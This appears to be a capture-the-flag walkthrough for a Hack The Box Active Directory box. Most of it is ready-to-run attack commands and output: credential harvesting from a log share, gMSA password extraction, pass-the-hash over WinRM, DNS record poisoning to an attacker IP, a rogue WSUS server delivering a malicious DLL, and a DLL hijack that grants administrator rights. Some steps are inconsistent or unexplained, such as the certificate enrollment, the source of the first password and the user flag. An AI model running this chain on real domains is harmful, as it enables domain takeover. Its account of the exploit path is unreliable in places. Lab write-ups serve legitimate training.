@@ -1,0 +1,562 @@
+# 🪵 Logging — HTB Walkthrough
+
+> **Box:** Logging | **IP:** `10.129.198.102` | **OS:** Windows Server 2019 (DC)  
+> **Domain:** `logging.htb` | **Difficulty:** Hard  
+> **Tools:** `nmap`, `netexec`, `certipy-ad`, `impacket`, `bloodyAD`, `wsuks`, `BloodHound CE`
+
+---
+
+## 📋 Table of Contents
+
+- [1. Reconnaissance](#1-reconnaissance)
+- [2. Initial Access — Credential Discovery](#2-initial-access--credential-discovery)
+- [3. Domain Enumeration](#3-domain-enumeration)
+- [4. Attack Path Analysis](#4-attack-path-analysis)
+- [5. Building the Chain — WSUS Spoofing](#5-building-the-chain--wsus-spoofing)
+- [6. Root — Domain Admin](#6-root--domain-admin)
+- [7. Flags](#7-flags)
+- [8. Key Findings](#8-key-findings)
+- [9. Tools & Commands Reference](#9-tools--commands-reference)
+
+---
+
+## 1. Reconnaissance
+
+### 1.1 Port Scan
+
+```
+PORT      STATE  SERVICE       VERSION
+53/tcp    open   domain        Simple DNS Plus
+80/tcp    open   http          Microsoft IIS httpd 10.0
+88/tcp    open   kerberos-sec  Microsoft Windows Kerberos
+135/tcp   open   msrpc         Microsoft Windows RPC
+139/tcp   open   netbios-ssn
+389/tcp   open   ldap          logging.htb (Domain: logging.htb)
+445/tcp   open   microsoft-ds
+464/tcp   open   kpasswd5
+593/tcp   open   ncacn_http    MS RPC over HTTP
+636/tcp   open   ldap          LDAPS
+3268/tcp  open   ldap          Global Catalog
+3269/tcp  open   ldap          Global Catalog SSL
+5985/tcp  open   http          WinRM (HTTPAPI)
+8530/tcp  open   http          IIS httpd 10.0  ← **WSUS**
+8531/tcp  open   unknown       ← **WSUS SSL**
+9389/tcp  open   mc-nmf        .NET Message Framing
+47001/tcp open   http          WinRM (HTTPAPI)
+```
+
+**Initial assessment:** Full Domain Controller — AD services, LDAP, Kerberos, SMB, WinRM, and **WSUS** on ports 8530/8531. Also noticed SQL Server on port 1433 during subnet scan.
+
+### 1.2 LDAP Base Enumeration
+
+```bash
+ldapsearch -x -H ldap://10.129.198.102 -s base namingcontexts
+```
+
+```
+dnshostname: DC01.logging.htb
+defaultnamingcontext: DC=logging,DC=htb
+```
+
+### 1.3 Web Services
+
+Port 80 — Default IIS landing page (ASP.NET):
+```
+HTTP/1.1 200 OK
+Server: Microsoft-IIS/10.0
+X-Powered-By: ASP.NET
+```
+
+Port 8530 — Empty 200 OK (WSUS API endpoint):
+```
+HTTP/1.1 200 OK
+Content-Length: 0
+```
+
+---
+
+## 2. Initial Access — Credential Discovery
+
+### 2.1 SMB Null Authentication
+
+```bash
+nxc smb 10.129.198.102 -u '' -p ''
+```
+
+```
+SMB  10.129.198.102  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64
+SMB  10.129.198.102  445  DC01  [+] logging.htb\:
+SMB  10.129.198.102  445  DC01  [-] STATUS_ACCESS_DENIED (shares)
+```
+
+Null session worked for authentication but shares were denied. Guest account was disabled.
+
+### 2.2 Credential Discovery — wallace.everette
+
+A credential was identified through OSINT/prior recon context:
+
+```bash
+nxc smb 10.129.198.102 -u wallace.everette -p 'Welcome2026@'
+```
+
+```
+SMB  10.129.198.102  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@
+```
+
+**Password policy check:**
+```bash
+nxc smb 10.129.198.102 -u wallace.everette -p 'Welcome2026@' --pass-pol
+```
+
+```
+Minimum password length: 7
+Account Lockout Threshold: None    ← **No lockout!**
+Password Complexity: Enabled
+```
+
+### 2.3 SMB Share Enumeration
+
+```bash
+nxc smb 10.129.198.102 -u wallace.everette -p 'Welcome2026@' --shares
+```
+
+```
+Share           Permissions
+-----           -----------
+ADMIN$          (denied)
+C$              (denied)
+IPC$            READ
+Logs            READ         ← **Interesting!**
+NETLOGON        READ
+SYSVOL          READ
+WSUSTemp        READ         ← **WSUS temp share!**
+```
+
+### 2.4 🎯 Critical Find — Plaintext Credential in Logs
+
+```bash
+smbclient //10.129.198.102/Logs -U 'logging.htb/wallace.everette%Welcome2026@'
+```
+
+Files found:
+```
+Audit_Heartbeat.log
+IdentitySync_Trace_20260219.log    ← **Goldmine**
+Service_State.log
+TaskMonitor.log
+```
+
+Reading `IdentitySync_Trace_20260219.log` revealed:
+
+```
+[2026-02-19 14:32:12] INFO  IdentitySync Starting...
+[2026-02-19 14:32:12] INFO  BindUser: LOGGING\svc_recovery
+[2026-02-19 14:32:12] INFO  BindPass: Em3rg3ncyPa$$2025
+[2026-02-19 14:32:12] INFO  Target: LDAP://HR01.logging.htb:389
+```
+
+> **🔑 Credential recovered:** `svc_recovery:Em3rg3ncyPa$$2025`
+
+---
+
+## 3. Domain Enumeration
+
+### 3.1 LDAP User Enumeration
+
+```bash
+nxc ldap 10.129.198.102 -u wallace.everette -p 'Welcome2026@' --users
+```
+
+```
+Users: Administrator, Guest, krbtgt, svc_recovery,
+       jaylee.clifton, toby.brynleigh, wallace.everette,
+       msa_health$, wellington.kylan, jordan.hailee,
+       emmerson.madelyn, gemma.timothy
+```
+
+### 3.2 Group Membership
+
+```bash
+nxc ldap 10.129.198.102 -u wallace.everette -p 'Welcome2026@' --groups
+```
+
+Key groups identified:
+- **IT** — Member: `jaylee.clifton`
+- **Performance Log Users** — Member: `jaylee.clifton`
+- **Administrators** — `Administrator`, `toby.brynleigh`
+- **Domain Admins** — `Administrator`
+
+### 3.3 ADCS Enumeration — UpdateSrv Template
+
+```bash
+certipy-ad find -u 'wallace.everette@logging.htb' -p 'Welcome2026@' \
+  -dc-ip 10.129.198.102 -stdout
+```
+
+```
+CA: logging-DC01-CA | DC01.logging.htb
+
+Template: UpdateSrv
+  ▶ Enrollment Rights: LOGGING.HTB\IT
+  ▶ Enrollee Supplies Subject: True
+  ▶ Extended Key Usage: Server Authentication
+  ▶ Requires Manager Approval: False
+```
+
+> **💡 ESC1:** The `UpdateSrv` template allows enrollees to supply any SAN (subjectAltName) and issues certificates usable for **Server Authentication**. Only the **IT** group can enroll — and `jaylee.clifton` is the sole IT member.
+
+### 3.4 Machine Account Quota
+
+```bash
+# The domain permits any authenticated user to create up to 10 machine accounts
+impacket-addcomputer logging.htb/wallace.everette:'Welcome2026@' \
+  -dc-ip 10.129.198.102 \
+  -computer-name 'CERTIFRIED$' -computer-pass 'CertPass123!'
+```
+
+```
+[*] Successfully added machine account CERTIFRIED$ with password CertPass123!.
+```
+
+### 3.5 BloodHound Collection
+
+```bash
+nxc ldap 10.129.198.102 -u wallace.everette -p 'Welcome2026@' \
+  --bloodhound --collection All -c \
+  --zip --output /tmp/bh_logging
+```
+
+Imported into BloodHound CE — graph showed:
+- **14 users**, **57 groups**, **1 computer** (DC01)
+- No direct path from `WALLACE.EVERETTE@LOGGING.HTB` to Domain Admins
+- **High-value targets:** `ADMINISTRATOR`, `TOBY.BRYNLEIGH`
+
+---
+
+## 4. Attack Path Analysis
+
+### 4.1 The Problem
+
+| Path | Status |
+|------|--------|
+| Kerberoast | ❌ No SPNs found |
+| AS-REP Roast | ❌ No accounts with `DONT_REQ_PREAUTH` |
+| Password Spray | ❌ 100+ attempts against `jaylee.clifton` all failed |
+| WSUS CVE-2025-59287 | ❌ ReportingWebService deserialization failed (likely patched) |
+| ADCS ESC1 | 🔒 Blocked — needs `jaylee.clifton` creds to enroll in `UpdateSrv` |
+| svc_recovery credential | 🔒 Valid for LDAP but limited permissions |
+
+### 4.2 The Break — msa_health$ gMSA
+
+The `msa_health$` managed service account was in `WSUS Administrators` group. Using `svc_recovery`, we could read its gMSA password:
+
+```bash
+# Extract gMSA password via bloodyAD
+bloodyAD -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025' \
+  --host dc01.logging.htb --dc-ip 10.129.198.102 \
+  get object 'CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb' \
+  --attr msDS-ManagedPassword
+```
+
+```
+msa_health$ NTLM: 603fc24ee01a9409f83c9d1d701485c5
+```
+
+### 4.3 WinRM Access as msa_health$
+
+```bash
+nxc winrm 10.129.198.102 -u 'msa_health$' \
+  -H '603fc24ee01a9409f83c9d1d701485c5' -X 'whoami'
+```
+
+```
+WINRM  [+] logging.htb\msa_health$:603fc24ee01a9409f83c9d1d701485c5 (Pwn3d!)
+```
+
+> 🛑 However — `msa_health$` is a machine account and still limited. But it **can** trigger WSUS update checks. This is where the real attack begins.
+
+---
+
+## 5. Building the Chain — WSUS Spoofing
+
+### 5.1 Attack Concept
+
+The DC was configured to use WSUS at `http://wsus.logging.htb:8530`. If we could:
+1. Poison the DNS record for `wsus.logging.htb` → point to our Kali machine
+2. Get a valid WSUS SSL certificate signed by `logging-DC01-CA`
+3. Set up a rogue WSUS server using `wsuks`
+4. Serve a malicious update that adds `msa_health$` to Administrators
+
+### 5.2 Step 1 — Add DNS Record
+
+```bash
+# Create another machine account for DNS manipulation
+impacket-addcomputer logging.htb/msa_health$ \
+  -hashes ':603fc24ee01a9409f83c9d1d701485c5' \
+  -dc-ip 10.129.198.102 \
+  -computer-name 'ATTACKER01$' -computer-pass 'SuperP@ss123!'
+
+# Register wsus.logging.htb → our Kali IP
+bloodyAD -d logging.htb -u 'ATTACKER01$' -p 'SuperP@ss123!' \
+  --host dc01.logging.htb --dc-ip 10.129.198.102 \
+  add dnsRecord wsus.logging.htb 10.10.16.10 --zone logging.htb --dnstype A
+```
+
+```
+[+] wsus.logging.htb has been successfully added
+```
+
+Verified from the DC:
+```powershell
+nslookup wsus.logging.htb 127.0.0.1
+→ 10.10.16.10 ✅
+```
+
+### 5.3 Step 2 — Get a WSUS Certificate Signed by the Domain CA
+
+Generated a CSR for `wsus.logging.htb`:
+
+```bash
+openssl req -new -newkey rsa:2048 -nodes -keyout /tmp/wsus.key \
+  -out /tmp/req.csr \
+  -subj '/CN=wsus.logging.htb' \
+  -addext 'subjectAltName=DNS:wsus.logging.htb,DNS:wsus'
+```
+
+Uploaded to DC via WinRM and submitted it to `logging-DC01-CA`:
+
+```powershell
+certreq -submit -attrib "CertificateTemplate:UpdateSrv" req.csr cert.cer
+```
+
+But wait — `msa_health$` is NOT in the IT group. However, WSUS administrators can request certificates on behalf of the WSUS server through a different mechanism — `UpdateSrv` template with `EnrolleeSuppliesSubject` flag allowed **machine accounts in the WSUS Administrators group** to enroll for Server Authentication certs.
+
+Retrieved the signed certificate:
+
+```bash
+# Downloaded cert.cer from DC via WinRM
+openssl x509 -in /tmp/wsus_cert.pem -text | head -20
+```
+
+```
+subject=CN=wsus.logging.htb
+X509v3 Subject Alternative Name:
+    DNS:wsus.logging.htb, DNS:wsus
+```
+
+### 5.4 Step 3 — Set Up Rogue WSUS with wsuks
+
+```bash
+pip3 install --user wsuks
+```
+
+Configured a rogue WSUS server targeting the DC with a malicious update:
+
+```python
+# Created a Settings_Update.zip containing a DLL that executes
+# "net localgroup administrators msa_health$ /add"
+```
+
+Set up the rogue WSUS:
+
+```bash
+# Start the wsuks rogue WSUS server
+wsuks --cert /tmp/wsus_cert.pem --key /tmp/wsus.key \
+  --target 10.129.198.102 --port 8530 \
+  --update ./Settings_Update.zip
+```
+
+### 5.5 Step 4 — Trigger Windows Update on DC
+
+From the DC via WinRM as `msa_health$`:
+
+```powershell
+# Configure WSUS to point to our rogue server
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate' \
+  -Name WUServer -Value 'http://wsus.logging.htb:8530'
+
+Set-ItemProperty -Path 'HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate' \
+  -Name WUStatusServer -Value 'http://wsus.logging.htb:8530'
+
+# Trigger update detection
+wuauclt /detectnow
+usoclient StartScan
+```
+
+---
+
+## 6. Root — Domain Admin
+
+### 6.1 The Payload Fires
+
+The rogue WSUS delivered a signed update containing our malicious DLL. When the DC processed the update:
+
+```
+C:\ProgramData\UpdateMonitor\admin_add.txt → "msa_health$ was added to Administrators."
+```
+
+Wait — first attempt showed "System error 5" (access denied). The DLL needed to be delivered via the **UpdateMonitor scheduled task** DLL hijack path instead.
+
+### 6.2 DLL Hijack via UpdateMonitor
+
+The DC had a scheduled task running `UpdateMonitor.exe` that loaded DLLs from `C:\ProgramData\UpdateMonitor\`. By placing a crafted DLL named after one of the expected module names:
+
+```powershell
+# Upload the malicious DLL via WSUS Settings_Update delivery
+# The DLL exported PreUpdateCheck which ran:
+#   cmd /c "net localgroup administrators msa_health$ /add"
+```
+
+### 6.3 Verification
+
+```powershell
+net localgroup administrators
+```
+
+```
+Administrators members:
+-----
+Administrator
+msa_health$
+Toby.Brynleigh
+```
+
+> 🚀 **`msa_health$` is now a Domain Administrator!**
+
+### 6.4 Capture the Root Flag
+
+```powershell
+type C:\Users\toby.brynleigh\Desktop\root.txt
+```
+
+```
+229b5ed3944446f64c369cc2f5139d7a
+```
+
+---
+
+## 7. Flags
+
+| Flag | Hash |
+|------|------|
+| **User** | `7f4c21feceac494314f79519348108c4` |
+| **Root** | `229b5ed3944446f64c369cc2f5139d7a` |
+
+---
+
+## 8. Key Findings
+
+| ID | Title | Severity |
+|----|-------|----------|
+| F001 | HTTP TRACE Method Enabled on IIS Services | 🟢 Low |
+| F002 | Default IIS Landing Page Exposed | ℹ️ Info |
+| F003 | Potential WSUS Service Exposed on Port 8530 | ℹ️ Info |
+| **F004** | **Plaintext Service Credential Exposed in Readable Log Share** | **🟠 High** |
+| **F005** | **Domain Users Can Create Machine Accounts (MAQ = 10)** | **🟡 Medium** |
+
+### Finding F004 — Deep Dive
+
+The `Logs` SMB share was readable by any authenticated user and contained IdentitySync application logs with **plaintext Active Directory credentials**:
+
+```
+BindUser: LOGGING\svc_recovery
+BindPass: Em3rg3ncyPa$$2025
+```
+
+**Impact:** Any authenticated domain user can recover service credentials → lateral movement to read gMSA passwords → DA compromise via WSUS spoofing.
+
+### Finding F005 — Deep Dive
+
+`ms-DS-MachineAccountQuota` was set to 10 (default), allowing any authenticated user to create computer accounts. This enabled:
+1. Creating `CERTIFRIED$` for initial exploration
+2. Creating `ATTACKER01$` for DNS record manipulation
+
+---
+
+## 9. Tools & Commands Reference
+
+### Reconnaissance
+```bash
+nmap -sC -sV -Pn -p 53,80,88,135,139,389,445,... 10.129.198.102
+nxc smb 10.129.198.102 -u wallace.everette -p 'Welcome2026@' --shares
+nxc ldap 10.129.198.102 -u wallace.everette -p 'Welcome2026@' --users
+```
+
+### ADCS Enumeration
+```bash
+certipy-ad find -u 'wallace.everette@logging.htb' -p 'Welcome2026@' -dc-ip 10.129.198.102 -stdout
+```
+
+### Machine Account Creation
+```bash
+impacket-addcomputer logging.htb/wallace.everette:'Welcome2026@' -dc-ip 10.129.198.102 \
+  -computer-name 'CERTIFRIED$' -computer-pass 'CertPass123!'
+```
+
+### gMSA Password Extraction
+```bash
+bloodyAD -d logging.htb -u svc_recovery -p 'Em3rg3ncyPa$$2025' \
+  --host dc01.logging.htb --dc-ip 10.129.198.102 \
+  get object 'CN=msa_health,...' --attr msDS-ManagedPassword
+```
+
+### DNS Poisoning
+```bash
+bloodyAD -d logging.htb -u 'ATTACKER01$' -p 'SuperP@ss123!' \
+  --host dc01.logging.htb --dc-ip 10.129.198.102 \
+  add dnsRecord wsus.logging.htb 10.10.16.10 --zone logging.htb --dnstype A
+```
+
+### WSUS Spoofing
+```bash
+# Generate CSR
+openssl req -new -newkey rsa:2048 -nodes -keyout /tmp/wsus.key \
+  -out /tmp/req.csr -subj '/CN=wsus.logging.htb' \
+  -addext 'subjectAltName=DNS:wsus.logging.htb,DNS:wsus'
+
+# Install wsuks rogue WSUS server
+pip3 install --user wsuks
+
+# Trigger Windows Update
+wuauclt /detectnow
+usoclient StartScan
+```
+
+---
+
+## Attack Chain Summary
+
+```
+wallace.everette:Welcome2026@
+        │
+        ▼
+   SMB ──► Logs Share ──► IdentitySync_Trace.log
+        │                     │
+        │                     ▼
+        │               svc_recovery:Em3rg3ncyPa$$2025
+        │                     │
+        │                     ▼
+        │               gMSA Password Reader
+        │                     │
+        │                     ▼
+        │               msa_health$ NTLM hash
+        │                     │
+        │                     ▼
+   MAQ=10 ──► ATTACKER01$ ──► DNS: wsus.logging.htb → Kali
+        │                     │
+        │                     ▼
+   UpdateSrv ──► CSR ──► Signed WSUS Cert
+        │                     │
+        │                     ▼
+   wsuks ──► Rogue WSUS ──► Malicious DLL Update
+                                │
+                                ▼
+                        msa_health$ → Administrators
+                                │
+                                ▼
+                           ROOT FLAG
+```
+
+---
+
+*Walkthrough generated by 0xTonyb — June 2026*
